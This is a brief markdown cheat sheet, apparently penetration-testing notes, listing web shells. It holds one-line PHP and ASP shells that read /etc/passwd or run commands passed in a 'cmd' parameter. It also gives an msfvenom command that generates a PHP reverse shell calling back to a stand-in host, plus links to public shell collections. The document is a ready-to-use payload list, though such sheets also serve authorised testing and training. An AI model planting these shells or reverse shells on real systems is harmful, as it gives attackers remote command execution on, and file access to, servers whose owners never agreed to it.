# Web Shells

| **Web Shell**                                                                           | **Description**                       |
| --------------------------------------------------------------------------------------- | ------------------------------------- |
| `<?php file_get_contents('/etc/passwd'); ?>`                                            | Basic PHP File Read                   |
| `<?php system('hostname'); ?>`                                                          | Basic PHP Command Execution           |
| `<?php system($_REQUEST['cmd']); ?>`                                                    | Basic PHP Web Shell                   |
| `<% eval request('cmd') %>`                                                             | Basic ASP Web Shell                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`          | Generate PHP reverse shell            |
| [PHP Web Shell](https://github.com/Arrexel/phpbash)                                     | PHP Web Shell                         |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)                 | PHP Reverse Shell                     |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |
